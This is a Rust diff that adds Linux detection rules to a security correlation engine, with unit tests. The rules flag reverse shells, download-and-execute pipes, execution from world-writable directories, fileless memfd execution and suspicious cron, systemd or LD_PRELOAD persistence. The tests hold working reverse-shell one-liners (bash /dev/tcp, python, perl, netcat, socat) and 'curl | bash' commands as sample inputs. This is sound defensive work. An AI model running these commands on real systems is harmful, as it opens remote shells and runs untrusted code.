@@ -486,6 +486,222 @@ pub fn correlate_in_batches(
     Ok(context.results())
 }
 
+// ---------------------------------------------------------------------------
+// Linux detection helpers (CORR-LIN-*). All checks are deterministic string
+// predicates over collected telemetry; see docs/DETECTION_RULES.md.
+// ---------------------------------------------------------------------------
+
+const UNIX_SHELLS: [&str; 8] = ["sh", "bash", "dash", "zsh", "ksh", "ash", "mksh", "fish"];
+const NETCAT_NAMES: [&str; 5] = ["nc", "ncat", "netcat", "nc.traditional", "nc.openbsd"];
+const SCRIPT_INTERPRETERS: [&str; 6] = ["python", "perl", "ruby", "php", "node", "lua"];
+/// Directories any local user can write to; legitimate software is not
+/// executed from them.
+const WORLD_WRITABLE_DIRS: [&str; 3] = ["/tmp/", "/var/tmp/", "/dev/shm/"];
+
+fn basename(path: &str) -> &str {
+    path.rsplit('/').next().unwrap_or(path)
+}
+
+/// A scalar observation field rendered as text ("" when absent).
+fn gs_num(obs: &Observation, key: &str) -> String {
+    match obs.data.get(key) {
+        Some(serde_json::Value::String(s)) => s.clone(),
+        Some(serde_json::Value::Number(n)) => n.to_string(),
+        _ => String::new(),
+    }
+}
+
+fn is_unix_shell(name: &str) -> bool {
+    UNIX_SHELLS.contains(&basename(name))
+}
+
+fn is_interpreter(name: &str) -> bool {
+    let base = basename(name);
+    SCRIPT_INTERPRETERS.iter().any(|i| base.starts_with(i))
+}
+
+fn world_writable_prefix(path: &str) -> Option<&'static str> {
+    WORLD_WRITABLE_DIRS
+        .iter()
+        .copied()
+        .find(|dir| path.starts_with(dir))
+}
+
+/// Tokens of a shell command with quoting, grouping, pipe and redirection
+/// characters removed (`2>&1|nc` -> `2`, `1`, `nc`).
+fn shell_tokens(segment: &str) -> Vec<&str> {
+    segment
+        .split(|c: char| {
+            c.is_whitespace()
+                || matches!(
+                    c,
+                    '\'' | '"' | '(' | ')' | '`' | '{' | '}' | '|' | ';' | '&' | '<' | '>'
+                )
+        })
+        .filter(|t| !t.is_empty())
+        .collect()
+}
+
+/// The program each segment of a shell command line executes, looking
+/// through common wrappers (`nohup`, `env`, `sudo`, `sh -c`, ...).
+fn executed_programs(command: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    for segment in command.split([';', '&', '|', '\n']) {
+        let tokens = shell_tokens(segment);
+        let mut i = 0;
+        while i < tokens.len() {
+            let t = tokens[i];
+            let base = basename(t);
+            let is_wrapper = matches!(
+                base,
+                "nohup" | "setsid" | "exec" | "env" | "sudo" | "nice" | "ionice" | "stdbuf"
+            ) || is_unix_shell(t)
+                || t.starts_with('-')
+                || (t.contains('=') && !t.starts_with('/'));
+            if is_wrapper {
+                i += 1;
+                continue;
+            }
+            out.push(t.to_string());
+            break;
+        }
+    }
+    out
+}
+
+/// A command that executes something from a world-writable directory.
+fn executes_from_world_writable(command: &str) -> Option<String> {
+    executed_programs(command)
+        .into_iter()
+        .find(|p| world_writable_prefix(p).is_some())
+}
+
+/// `curl ... | sh`, `wget -O- ... | sudo bash`.
+fn pipes_download_into_shell(cmd_lower: &str) -> bool {
+    let segments: Vec<&str> = cmd_lower.split('|').collect();
+    if segments.len() < 2 {
+        return false;
+    }
+    let mut downloaded = false;
+    for (idx, segment) in segments.iter().enumerate() {
+        let tokens = shell_tokens(segment);
+        if idx > 0 && downloaded {
+            let first = tokens
+                .iter()
+                .find(|t| !matches!(basename(t), "sudo" | "env") && !t.starts_with('-'))
+                .copied()
+                .unwrap_or("");
+            if is_unix_shell(first) || is_interpreter(first) {
+                return true;
+            }
+        }
+        if tokens
+            .iter()
+            .any(|t| matches!(basename(t), "curl" | "wget" | "fetch"))
+        {
+            downloaded = true;
+        }
+    }
+    false
+}
+
+/// Recognizes the common reverse-shell one-liners. `actor` is the process
+/// that runs the command line (its name, lowercased); when present the
+/// pattern must be executed by a matching program, so e.g. `grep /dev/tcp/`
+/// or an editor showing such text does not match. Commands from persistence
+/// entries are checked without an actor.
+fn reverse_shell_pattern(cmd_lower: &str, actor: Option<&str>) -> Option<&'static str> {
+    let actor_is = |pred: &dyn Fn(&str) -> bool| actor.map(pred).unwrap_or(true);
+    let tokens = shell_tokens(cmd_lower);
+
+    if (cmd_lower.contains("/dev/tcp/") || cmd_lower.contains("/dev/udp/"))
+        && actor_is(&|a: &str| is_unix_shell(a))
+    {
+        return Some("перенаправление оболочки в /dev/tcp");
+    }
+
+    let nc_pos = tokens
+        .iter()
+        .position(|t| NETCAT_NAMES.contains(&basename(t)));
+    if let Some(pos) = nc_pos {
+        let exec_flag = tokens[pos + 1..].iter().any(|t| {
+            matches!(*t, "--exec" | "--sh-exec" | "--lua-exec")
+                || (t.starts_with('-')
+                    && !t.starts_with("--")
+                    && (t.contains('e') || t.contains('c')))
+        });
+        if exec_flag && actor_is(&|a: &str| NETCAT_NAMES.contains(&basename(a)) || is_unix_shell(a))
+        {
+            return Some("netcat с исполнением команды (-e/-c)");
+        }
+        if (cmd_lower.contains("mkfifo") || cmd_lower.contains("mknod"))
+            && actor_is(&|a: &str| is_unix_shell(a))
+        {
+            return Some("именованный канал + netcat");
+        }
+    }
+
+    let interp = tokens.iter().any(|t| is_interpreter(t));
+    if interp
+        && (cmd_lower.contains("socket") || cmd_lower.contains("fsockopen"))
+        && [
+            "pty",
+            "subprocess",
+            "dup2",
+            "/bin/sh",
+            "/bin/bash",
+            "exec",
+            "spawn",
+            "sh -i",
+        ]
+        .iter()
+        .any(|k| cmd_lower.contains(k))
+        && actor_is(&|a: &str| is_interpreter(a) || is_unix_shell(a))
+    {
+        return Some("однострочник интерпретатора с сокетом и оболочкой");
+    }
+
+    if tokens.iter().any(|t| basename(t) == "socat")
+        && (cmd_lower.contains("exec:") || cmd_lower.contains("system:"))
+        && ["tcp", "udp", "ssl", "openssl"]
+            .iter()
+            .any(|k| cmd_lower.contains(k))
+        && actor_is(&|a: &str| basename(a) == "socat" || is_unix_shell(a))
+    {
+        return Some("socat с exec/system");
+    }
+    None
+}
+
+/// A remote address that is neither loopback nor unspecified.
+fn is_external_address(addr: &str) -> bool {
+    let Ok(ip) = addr.trim().parse::<std::net::IpAddr>() else {
+        return false;
+    };
+    match ip {
+        std::net::IpAddr::V4(v4) => !v4.is_loopback() && !v4.is_unspecified(),
+        std::net::IpAddr::V6(v6) => {
+            !v6.is_loopback()
+                && !v6.is_unspecified()
+                && !v6
+                    .to_ipv4_mapped()
+                    .is_some_and(|v4| v4.is_loopback() || v4.is_unspecified())
+        }
+    }
+}
+
+/// MITRE technique for a Linux persistence mechanism.
+fn linux_persistence_technique(mechanism: &str) -> Option<(&'static str, &'static str)> {
+    Some(match mechanism {
+        "cron" | "cron_periodic" => ("T1053.003", "cron"),
+        "systemd_timer" => ("T1053.006", "таймер systemd"),
+        "systemd_service" | "systemd_user_service" => ("T1543.002", "служба systemd"),
+        "rc_local" => ("T1037.004", "rc.local"),
+        "xdg_autostart" => ("T1547.013", "XDG autostart"),
+        _ => return None,
+    })
+}
+
 struct Cand {
     ent_type: EntityType,
     key: String,
@@ -568,6 +784,11 @@ impl DeterministicCorrelationEngine {
             let proc_lower = proc_name.to_lowercase();
             let parent_lower = parent_name.to_lowercase();
             let exec_lower = exec_path.to_lowercase();
+            let is_linux = gs("platform") == "linux";
+            // `-enc` is a PowerShell flag; on Linux it only means something
+            // when PowerShell itself runs.
+            let powershell_context =
+                !is_linux || proc_lower.contains("pwsh") || proc_lower.contains("powershell");
 
             if let Some(cmd) = cmd_opt {
                 let cmd_lower = cmd.to_lowercase();
@@ -621,7 +842,9 @@ impl DeterministicCorrelationEngine {
                         Some("Discovery"),
                         "Разведка учетных записей и структуры домена",
                     ));
-                } else if cmd_lower.contains("-enc") || cmd_lower.contains("-encodedcommand") {
+                } else if powershell_context
+                    && (cmd_lower.contains("-enc") || cmd_lower.contains("-encodedcommand"))
+                {
                     candidate_facts.push(Cand::new(
                         EntityType::Process,
                         format!("{}:proc:obfuscated", host),
@@ -786,6 +1009,225 @@ impl DeterministicCorrelationEngine {
                         Some("Command and Control"), format!("Командный интерпретатор ({}) инициировал исходящее подключение к {}:{}", proc_name, dest_ip, port),
                     ));
                 }
+            }
+
+            // 5. Linux host telemetry (CORR-LIN-*)
+            let actor = if proc_name.is_empty() {
+                basename(exec_path).to_lowercase()
+            } else {
+                proc_lower.clone()
+            };
+
+            if let Some(cmd) = cmd_opt {
+                let cmd_lower = cmd.to_lowercase();
+                if let Some(pattern) = reverse_shell_pattern(&cmd_lower, Some(&actor)) {
+                    candidate_facts.push(Cand::new(
+                        EntityType::Process,
+                        format!("{}:proc:revshell:{}", host, gs_num(obs, "pid")),
+                        "ReverseShellCommandLine",
+                        0.95,
+                        Severity::Critical,
+                        95.0,
+                        Some(PainLevel::TTPs),
+                        "CORR-LIN-001a",
+                        Some("T1059.004"),
+                        Some("Execution"),
+                        format!(
+                            "Командная строка реверс-шелла ({}) в процессе {}: {}",
+                            pattern, proc_name, cmd
+                        ),
+                    ));
+                } else if is_unix_shell(&actor) && pipes_download_into_shell(&cmd_lower) {
+                    candidate_facts.push(Cand::new(
+                        EntityType::Process,
+                        format!("{}:proc:download_exec:{}", host, gs_num(obs, "pid")),
+                        "DownloadPipedToShell",
+                        0.85,
+                        Severity::High,
+                        80.0,
+                        Some(PainLevel::Tools),
+                        "CORR-LIN-001d",
+                        Some("T1105"),
+                        Some("Command and Control"),
+                        format!(
+                            "Загрузка и немедленное исполнение кода через конвейер в оболочку: {}",
+                            cmd
+                        ),
+                    ));
+                }
+            }
+
+            if let Some(dir) = world_writable_prefix(exec_path) {
+                candidate_facts.push(Cand::new(
+                    EntityType::Process,
+                    format!("{}:proc:ww_exec:{}", host, exec_path),
+                    "ProcessFromWorldWritableDir",
+                    0.80,
+                    Severity::High,
+                    75.0,
+                    Some(PainLevel::HostArtifacts),
+                    "CORR-LIN-001b",
+                    Some("T1036.005"),
+                    Some("Defense Evasion"),
+                    format!(
+                        "Процесс {} запущен из общедоступного для записи каталога {}: {}",
+                        proc_name, dir, exec_path
+                    ),
+                ));
+            }
+
+            if obs.data.get("exe_deleted").and_then(|v| v.as_bool()) == Some(true) {
+                if exec_path.starts_with("/memfd:") {
+                    candidate_facts.push(Cand::new(
+                        EntityType::Process,
+                        format!("{}:proc:memfd:{}", host, exec_path),
+                        "FilelessMemfdExecution",
+                        0.85,
+                        Severity::High,
+                        80.0,
+                        Some(PainLevel::TTPs),
+                        "CORR-LIN-001e",
+                        Some("T1620"),
+                        Some("Defense Evasion"),
+                        format!(
+                            "Бесфайловое исполнение из анонимной памяти (memfd) процессом {} (PID {}): {}",
+                            proc_name,
+                            gs_num(obs, "pid"),
+                            exec_path
+                        ),
+                    ));
+                } else {
+                    // Package upgrades also leave running daemons with a
+                    // deleted image until they are restarted; that case is
+                    // graded lower but still reported.
+                    let packaged = ["/usr/", "/bin/", "/sbin/", "/lib", "/opt/"]
+                        .iter()
+                        .any(|p| exec_path.starts_with(p));
+                    let (sev, risk) = if packaged {
+                        (Severity::Medium, 45.0)
+                    } else {
+                        (Severity::High, 80.0)
+                    };
+                    candidate_facts.push(Cand::new(
+                        EntityType::Process,
+                        format!("{}:proc:deleted_exe:{}", host, exec_path),
+                        "DeletedExecutableRunning",
+                        0.80,
+                        sev,
+                        risk,
+                        Some(PainLevel::HostArtifacts),
+                        "CORR-LIN-001c",
+                        Some("T1070.004"),
+                        Some("Defense Evasion"),
+                        format!(
+                            "Исполняемый файл работающего процесса {} (PID {}) удалён с диска: {}",
+                            proc_name,
+                            gs_num(obs, "pid"),
+                            exec_path
+                        ),
+                    ));
+                }
+            }
+
+            let mechanism = gs("mechanism");
+            if let Some((tech, label)) = linux_persistence_technique(mechanism) {
+                let command = if !gs("value_data").is_empty() {
+                    gs("value_data")
+                } else {
+                    gs("action")
+                };
+                let lower = command.to_lowercase();
+                let verdict = if let Some(pattern) = reverse_shell_pattern(&lower, None) {
+                    Some((
+                        format!("реверс-шелл: {}", pattern),
+                        Severity::Critical,
+                        95.0,
+                    ))
+                } else if pipes_download_into_shell(&lower) {
+                    Some((
+                        "загрузка и исполнение через конвейер в оболочку".to_string(),
+                        Severity::High,
+                        85.0,
+                    ))
+                } else {
+                    executes_from_world_writable(command).map(|program| {
+                        (
+                            format!("запуск из общедоступного для записи каталога: {}", program),
+                            Severity::High,
+                            85.0,
+                        )
+                    })
+                };
+                if let Some((why, sev, risk)) = verdict {
+                    let item = [gs("item_name"), gs("task_name"), gs("autorun_key")]
+                        .into_iter()
+                        .find(|s| !s.is_empty())
+                        .unwrap_or("");
+                    candidate_facts.push(Cand::new(
+                        EntityType::Host,
+                        format!("{}:persist:{}:{}", host, mechanism, item),
+                        "SuspiciousLinuxPersistence",
+                        0.90,
+                        sev,
+                        risk,
+                        Some(PainLevel::TTPs),
+                        "CORR-LIN-002a",
+                        Some(tech),
+                        Some("Persistence"),
+                        format!(
+                            "Подозрительное закрепление через {} ({}): {}",
+                            label, why, command
+                        ),
+                    ));
+                }
+            }
+
+            if mechanism == "ld_preload" {
+                let lib = gs("value_data");
+                candidate_facts.push(Cand::new(
+                    EntityType::Host,
+                    format!("{}:persist:ld_preload:{}", host, lib),
+                    "DynamicLinkerPreload",
+                    0.85,
+                    Severity::High,
+                    80.0,
+                    Some(PainLevel::HostArtifacts),
+                    "CORR-LIN-002b",
+                    Some("T1574.006"),
+                    Some("Defense Evasion"),
+                    format!(
+                        "Библиотека принудительно подгружается во все процессы через /etc/ld.so.preload: {}",
+                        lib
+                    ),
+                ));
+            }
+
+            if obs.raw_event_type == "network_socket"
+                && is_unix_shell(&actor)
+                && gs("state").eq_ignore_ascii_case("established")
+                && is_external_address(gs("destination_ip"))
+            {
+                let dest = gs("destination_ip");
+                let port = gs_num(obs, "destination_port");
+                candidate_facts.push(Cand::new(
+                    EntityType::NetworkSocket,
+                    format!("{}:{}", dest, port),
+                    "ShellNetworkConnection",
+                    0.95,
+                    Severity::Critical,
+                    94.0,
+                    Some(PainLevel::NetworkArtifacts),
+                    "CORR-LIN-003",
+                    Some("T1071"),
+                    Some("Command and Control"),
+                    format!(
+                        "Командная оболочка {} (PID {}) держит установленное соединение с {}:{}",
+                        proc_name,
+                        gs_num(obs, "owning_pid"),
+                        dest,
+                        port
+                    ),
+                ));
             }
 
             // Aggregate candidate facts into facts vector
@@ -966,6 +1408,328 @@ mod tests {
         let f = engine.correlate(&[obs]).unwrap();
         assert_eq!(f[0].fact_type, "SuspiciousC2Connection");
         assert_eq!(f[0].data["rule_id"], "CORR-WIN-003a");
+    }
+
+    fn linux_obs(event_type: &str, data: serde_json::Value) -> Observation {
+        let mut data = data;
+        let obj = data.as_object_mut().unwrap();
+        obj.insert("platform".into(), serde_json::json!("linux"));
+        obj.insert("host".into(), serde_json::json!("srv-lin-01"));
+        make_test_obs(EntityId::new_v7(), "linux_collector", event_type, data)
+    }
+
+    fn rules_fired(obs: Observation) -> Vec<(String, String, String)> {
+        DeterministicCorrelationEngine::new()
+            .correlate(&[obs])
+            .unwrap()
+            .into_iter()
+            .map(|f| {
+                (
+                    f.data["rule_id"].as_str().unwrap().to_string(),
+                    f.fact_type.clone(),
+                    f.data["mitre_technique"].as_str().unwrap_or("").to_string(),
+                )
+            })
+            .collect()
+    }
+
+    fn fired(obs: Observation) -> Vec<String> {
+        rules_fired(obs).into_iter().map(|(r, _, _)| r).collect()
+    }
+
+    #[test]
+    fn linux_reverse_shell_command_line_produces_fact() {
+        let obs = linux_obs(
+            "process",
+            serde_json::json!({
+                "process_name": "bash", "pid": 4242, "ppid": 4100,
+                "executable_path": "/usr/bin/bash",
+                "command_line": "bash -c bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"
+            }),
+        );
+        let facts = DeterministicCorrelationEngine::new()
+            .correlate(std::slice::from_ref(&obs))
+            .unwrap();
+        assert_eq!(facts.len(), 1);
+        let f = &facts[0];
+        assert_eq!(f.fact_type, "ReverseShellCommandLine");
+        assert_eq!(f.data["rule_id"], "CORR-LIN-001a");
+        assert_eq!(f.data["mitre_technique"], "T1059.004");
+        assert_eq!(f.data["mitre_tactic"], "Execution");
+        assert_eq!(f.severity, Severity::Critical);
+        assert_eq!(f.entity_key, "srv-lin-01:proc:revshell:4242");
+        assert_eq!(f.evidence_ids, vec![obs.id]);
+    }
+
+    #[test]
+    fn linux_reverse_shell_variants() {
+        let cases = [
+            ("python3", "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0);import pty; pty.spawn(\"/bin/sh\")"),
+            ("nc", "nc -e /bin/sh 10.0.0.1 4444"),
+            ("ncat", "ncat 10.0.0.1 4444 --sh-exec /bin/bash"),
+            ("sh", "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"),
+            ("perl", "perl -e use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");exec(\"/bin/sh -i\");};"),
+            ("socat", "socat tcp-connect:10.0.0.1:4444 exec:/bin/bash,pty,stderr,setsid"),
+        ];
+        for (name, cmd) in cases {
+            let rules = fired(linux_obs(
+                "process",
+                serde_json::json!({"process_name": name, "pid": 1, "command_line": cmd}),
+            ));
+            assert!(
+                rules.contains(&"CORR-LIN-001a".to_string()),
+                "{} => {:?}",
+                cmd,
+                rules
+            );
+        }
+    }
+
+    #[test]
+    fn linux_reverse_shell_text_in_unrelated_process_is_not_a_finding() {
+        for (name, cmd) in [
+            ("grep", "grep -r /dev/tcp/ /etc"),
+            ("vim", "vim notes-about-nc -e-and-python-socket-pty.md"),
+            ("bash", "/bin/bash /usr/local/bin/backup.sh --full"),
+            ("nc", "nc -zv 10.0.0.1 22"),
+            ("python3", "python3 -m http.server 8000"),
+        ] {
+            let rules = fired(linux_obs(
+                "process",
+                serde_json::json!({"process_name": name, "pid": 1, "command_line": cmd}),
+            ));
+            assert!(rules.is_empty(), "{} => {:?}", cmd, rules);
+        }
+    }
+
+    #[test]
+    fn linux_download_piped_to_shell() {
+        let rules = rules_fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "sh", "pid": 7,
+                "command_line": "sh -c curl -fsSL http://203.0.113.7/x.sh | sudo bash -s"}),
+        ));
+        assert_eq!(
+            rules,
+            vec![(
+                "CORR-LIN-001d".into(),
+                "DownloadPipedToShell".into(),
+                "T1105".into()
+            )]
+        );
+        // Downloading to a file is not the piped-execution pattern.
+        assert!(fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "sh", "pid": 7,
+                "command_line": "sh -c curl -o /var/cache/x.tgz https://example.org/x.tgz | tee log"}),
+        ))
+        .is_empty());
+    }
+
+    #[test]
+    fn linux_execution_from_world_writable_dirs() {
+        for path in ["/tmp/.x/kworker", "/var/tmp/upd", "/dev/shm/agent"] {
+            let rules = rules_fired(linux_obs(
+                "process",
+                serde_json::json!({"process_name": "kworker", "pid": 9, "executable_path": path}),
+            ));
+            assert_eq!(
+                rules,
+                vec![(
+                    "CORR-LIN-001b".into(),
+                    "ProcessFromWorldWritableDir".into(),
+                    "T1036.005".into()
+                )],
+                "{}",
+                path
+            );
+        }
+        assert!(fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "sshd", "pid": 9, "executable_path": "/usr/sbin/sshd"}),
+        ))
+        .is_empty());
+        // "/tmpfoo" is not under /tmp.
+        assert!(fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "x", "pid": 9, "executable_path": "/tmpfoo/x"}),
+        ))
+        .is_empty());
+    }
+
+    #[test]
+    fn linux_deleted_and_fileless_executables() {
+        let engine = DeterministicCorrelationEngine::new();
+        let dropped = engine
+            .correlate(&[linux_obs(
+                "process",
+                serde_json::json!({"process_name": "x", "pid": 31, "executable_path": "/home/bob/.cache/x", "exe_deleted": true}),
+            )])
+            .unwrap();
+        assert_eq!(dropped.len(), 1);
+        assert_eq!(dropped[0].data["rule_id"], "CORR-LIN-001c");
+        assert_eq!(dropped[0].severity, Severity::High);
+
+        let upgraded = engine
+            .correlate(&[linux_obs(
+                "process",
+                serde_json::json!({"process_name": "sshd", "pid": 32, "executable_path": "/usr/sbin/sshd", "exe_deleted": true}),
+            )])
+            .unwrap();
+        assert_eq!(upgraded[0].data["rule_id"], "CORR-LIN-001c");
+        assert_eq!(upgraded[0].severity, Severity::Medium);
+
+        let memfd = rules_fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "6", "pid": 79, "executable_path": "/memfd:payload", "exe_deleted": true}),
+        ));
+        assert_eq!(
+            memfd,
+            vec![(
+                "CORR-LIN-001e".into(),
+                "FilelessMemfdExecution".into(),
+                "T1620".into()
+            )]
+        );
+
+        let tmp_deleted = fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "x", "pid": 33, "executable_path": "/tmp/x", "exe_deleted": true}),
+        ));
+        assert_eq!(tmp_deleted, vec!["CORR-LIN-001b", "CORR-LIN-001c"]);
+    }
+
+    #[test]
+    fn linux_persistence_rules() {
+        let cron = rules_fired(linux_obs(
+            "scheduled_task",
+            serde_json::json!({"task_name": "backdoor:1", "mechanism": "cron",
+                "action": "nohup /var/tmp/.cache/kworker -c /var/tmp/.cache/cfg >/dev/null 2>&1"}),
+        ));
+        assert_eq!(
+            cron,
+            vec![(
+                "CORR-LIN-002a".into(),
+                "SuspiciousLinuxPersistence".into(),
+                "T1053.003".into()
+            )]
+        );
+
+        let unit = rules_fired(linux_obs(
+            "autorun",
+            serde_json::json!({"item_name": "evil.service", "mechanism": "systemd_service",
+                "value_data": "/dev/shm/.k/agent --daemon", "target_path": "/dev/shm/.k/agent"}),
+        ));
+        assert_eq!(unit[0].2, "T1543.002");
+
+        let engine = DeterministicCorrelationEngine::new();
+        let rc = engine
+            .correlate(&[linux_obs(
+                "autorun",
+                serde_json::json!({"item_name": "line 3", "mechanism": "rc_local",
+                    "value_data": "bash -c 'bash -i >& /dev/tcp/198.51.100.9/443 0>&1' &"}),
+            )])
+            .unwrap();
+        assert_eq!(rc[0].data["mitre_technique"], "T1037.004");
+        assert_eq!(rc[0].severity, Severity::Critical);
+
+        let xdg = rules_fired(linux_obs(
+            "autorun",
+            serde_json::json!({"item_name": "Updater", "mechanism": "xdg_autostart",
+                "value_data": "curl -s http://203.0.113.7/p | bash"}),
+        ));
+        assert_eq!(xdg[0].2, "T1547.013");
+
+        let timer = rules_fired(linux_obs(
+            "scheduled_task",
+            serde_json::json!({"task_name": "x.timer", "mechanism": "systemd_timer",
+                "action": "/bin/sh /tmp/.t/run.sh"}),
+        ));
+        assert_eq!(timer[0].2, "T1053.006");
+
+        let preload = rules_fired(linux_obs(
+            "autorun",
+            serde_json::json!({"item_name": "/usr/lib/libprocesshider.so", "mechanism": "ld_preload",
+                "value_data": "/usr/lib/libprocesshider.so"}),
+        ));
+        assert_eq!(
+            preload,
+            vec![(
+                "CORR-LIN-002b".into(),
+                "DynamicLinkerPreload".into(),
+                "T1574.006".into()
+            )]
+        );
+
+        // Ordinary distribution entries, including ones that merely touch /tmp.
+        for (mechanism, command) in [
+            ("cron", "cd / && run-parts --report /etc/cron.hourly"),
+            ("cron", "find /tmp -type f -mtime +7 -delete"),
+            ("cron", "rm -rf /tmp/php-sessions/*"),
+            ("cron_periodic", "/etc/cron.daily/apt-compat"),
+            (
+                "systemd_service",
+                "/usr/bin/redis-server /etc/redis/redis.conf --supervised systemd",
+            ),
+            ("systemd_timer", "/usr/lib/apt/apt.systemd.daily install"),
+        ] {
+            let rules = fired(linux_obs(
+                "scheduled_task",
+                serde_json::json!({"task_name": "t", "mechanism": mechanism, "action": command}),
+            ));
+            assert!(rules.is_empty(), "{} => {:?}", command, rules);
+        }
+    }
+
+    #[test]
+    fn linux_shell_with_external_connection() {
+        let sock = |state: &str, dest: &str, name: &str| {
+            linux_obs(
+                "network_socket",
+                serde_json::json!({"process_name": name, "owning_pid": 4242, "state": state,
+                    "destination_ip": dest, "destination_port": 443, "local_port": 51000}),
+            )
+        };
+        assert_eq!(
+            rules_fired(sock("Established", "198.51.100.9", "bash")),
+            vec![(
+                "CORR-LIN-003".into(),
+                "ShellNetworkConnection".into(),
+                "T1071".into()
+            )]
+        );
+        assert!(fired(sock("Established", "127.0.0.1", "bash")).is_empty());
+        assert!(fired(sock("Established", "::ffff:127.0.0.1", "bash")).is_empty());
+        assert!(fired(sock("Listen", "0.0.0.0", "bash")).is_empty());
+        assert!(fired(sock("Established", "198.51.100.9", "curl")).is_empty());
+    }
+
+    #[test]
+    fn powershell_encoded_rule_is_scoped_to_powershell_on_linux() {
+        // A Linux process whose arguments merely contain "-enc".
+        assert!(fired(linux_obs(
+            "process",
+            serde_json::json!({"process_name": "ffmpeg", "pid": 5,
+                "command_line": "ffmpeg -i in.mp4 -encoder libx264 out.mp4"}),
+        ))
+        .is_empty());
+        // PowerShell on Linux is still covered...
+        assert_eq!(
+            fired(linux_obs(
+                "process",
+                serde_json::json!({"process_name": "pwsh", "pid": 5,
+                    "command_line": "pwsh -enc SQBFAFgA"}),
+            )),
+            vec!["CORR-WIN-001d"]
+        );
+        // ...and observations without a platform (EVTX, Sysmon) are unchanged.
+        let evtx = make_test_obs(
+            EntityId::new_v7(),
+            "evtx_parser",
+            "process_create",
+            serde_json::json!({"command_line": "powershell.exe -enc SQBFAFgA", "host": "PC"}),
+        );
+        assert_eq!(fired(evtx), vec!["CORR-WIN-001d"]);
     }
 
     fn make_phase4_obs(
